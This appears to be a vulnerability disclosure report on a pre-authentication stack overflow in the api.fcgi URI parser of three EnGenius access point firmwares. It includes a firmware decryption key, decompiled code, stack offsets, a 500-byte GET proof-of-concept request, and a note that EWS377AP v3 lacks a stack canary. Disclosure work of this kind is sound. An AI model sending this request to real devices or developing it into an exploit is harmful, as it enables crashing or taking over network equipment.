# EnGenius ECW336 1.6.71 was discovered to contain a pre-auth stack buffer overflow in the /api URI parser

## Overview

- Vendor: EnGenius
- Product: ECW336 1.6.71, EWS377AP v3 3.9.3.2, EWS276-FIT 1.0.45
- Version: 1.6.71 / 3.9.3.2 / 1.0.45
- Component: /www/cgi-bin/api.fcgi request URI parser in main
- Vulnerability Class: CWE-121 stack buffer overflow
- CVSS 3.1 (tentative): 9.8 Critical for EWS377AP v3 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (no stack canary in `api.fcgi`; a 500-byte path segment reaches the saved return path); 7.5 High for ECW336/EWS276 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (DoS/memory corruption; EWS276 has `__stack_chk_guard`)
- Manufacturer: https://www.engeniustech.com/

## Affected versions

### ECW336 1.6.71

- `ecw336-1.6.71-1.zip`.
- `ecw336-1.6.71-1.bin`.
- Decrypted image (EnGenius XOR header transform).
- `/www/cgi-bin/api.fcgi`.

### EWS377AP v3 3.9.3.2

- `EWS377APv3-FWv3.9.3.2_c1.9.51.zip`.
- Inner `EWS377APv3-FWv3.9.3.2_c1.9.51.bin`.
- `/www/cgi-bin/api.fcgi`.

### EWS276-FIT 1.0.45

- `ews276-fit-1.0.45-2.bin`.
- `/www/cgi-bin/api.fcgi`.

## Vulnerability details

The images use the known EnGenius XOR header transform (key
`ac 78 3c 9e cf 67 b3 59`, length byte at `0x87`, data starting at
`n + 0x88`; public `ryancdotorg` gist). Decryption yields:

- ECW336: DTB + UBI, 29.9 MB SquashFS rootfs;
- EWS377AP v3: DTB + UBI, 18.9 MB SquashFS rootfs;
- EWS276-FIT: tar -> 27.0 MB SquashFS rootfs.

`api.fcgi` is served as the `/api` FastCGI handler by
`senao-openapi-server` on ports 8000 (HTTP) and 4430 (HTTPS), with
lighttpd authentication commented out; `api.fcgi` performs its own token
checks later, after URI parsing.

All three `main` functions parse the URI with the same unbounded format:

```c
sscanf(v70, "/api%[^?]", v69);       // request URI -> 256-byte buffer
sscanf(v69,
  "/%[^/]/%[^/]/%[^/]/%[^/]/%[^/]/%[^/]/%[^/]",
  v61, v62, v63, &v63[32], &v63[64], &v63[96], &v63[128]);
```

- ECW336 has `_OWORD v59[14]` (224 bytes) as the first destination and
  `v61[256]`/`v62[512]` for the URI;
- EWS377AP v3 and EWS276-FIT have `v61[32]`, `v62[32]`, `v63[152]` and
  the same seven `%[^/]` conversions: segments 3-7 are written at
  `v63+0/32/64/96/128`.

No `%[^/]` has a field width. A path segment longer than the destination
slot overwrites adjacent stack variables. The parser runs before any
token/authentication check, so a request to `/api/<long-segment>` from
the management network reaches it without credentials.

For EWS377AP v3, `v61` is at `bp-0x168`; a ~500-byte segment (the
`REQUEST_URI` is capped at 511 bytes) reaches past the saved frame,
and `api.fcgi` has no `__stack_chk_guard`. EWS276-FIT ships
`__stack_chk_guard`/`__stack_chk_fail`, so the same overwrite aborts.
ECW336's 224-byte first buffer gives a smaller overflow that corrupts
`s`/`v61` but may not reach the saved return address.

A local ASAN reproduction with a 500-byte segment reports a 501-byte
write into the 32-byte `v61` (EWS layout) and into the 224-byte ECW336
buffer (`stack-buffer-overflow`).

## PoC

```http
GET /api/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: <access-point>:8000
```

The path after `/api` is one ~500-byte segment. On port 4430 use HTTPS.
The same handler is used by all three models; EWS377AP v3 is the
strongest target because the overwrite reaches the saved frame and the
binary has no stack canary.

## Verification

The vulnerable handler in the stock `/www/cgi-bin/api.fcgi request URI parser in main` was decompiled from the unpacked rootfs; the relevant code and offsets are quoted above. No dynamic run was completed.

## Impact

An unauthenticated attacker on the management LAN can send a long
`/api` URI and corrupt the FastCGI worker's stack. On EWS377AP v3 the
500-byte segment reaches the saved frame and there is no stack canary,
so this is a strong pre-auth code-execution candidate (no ROP chain was
developed). On EWS276-FIT the canary turns it into a reliable crash/DoS;
on ECW336 the 224-byte buffer gives a smaller corruption/DoS.

## Remediation / known-CVE relation

- Add field widths to every `%[^/]` conversion (e.g. `%31[^/]`) and
  validate the URI segment count/length before parsing.
- Reject requests whose path segments exceed the fixed component size.
- NVD/OSV keyword searches for `EnGenius api.fcgi`,
  `senao-openapi-server`, `ECW336` and `EWS377AP` URI `sscanf` returned
  no matching CVE on 2026-11-08. Candidate 0-day; no CVE assigned and no
  vendor contact has been made.

## Additional Information

```markdown
### Vendor
EnGenius

### Product
ECW336 1.6.71, EWS377AP v3 3.9.3.2, EWS276-FIT 1.0.45

### Version or Commit
1.6.71 / 3.9.3.2 / 1.0.45

### Vulnerability Class
CWE-121 stack buffer overflow

### Description
The /api request URI is parsed with sscanf into a fixed stack buffer in api.fcgi; a long URI overflows the buffer before authentication.

### Affected_component
/www/cgi-bin/api.fcgi request URI parser in main

### Attack_vector
Unauthenticated request to /api with an oversized request URI.

### Product_version
ECW336 1.6.71, EWS377AP v3 3.9.3.2, EWS276-FIT 1.0.45 1.6.71 / 3.9.3.2 / 1.0.45

### Reference
- https://www.engeniustech.com/
- https://github.com/vuln-1/vuln/blob/main/EnGenius/ECW336_V1.6.71/report-1.md
```
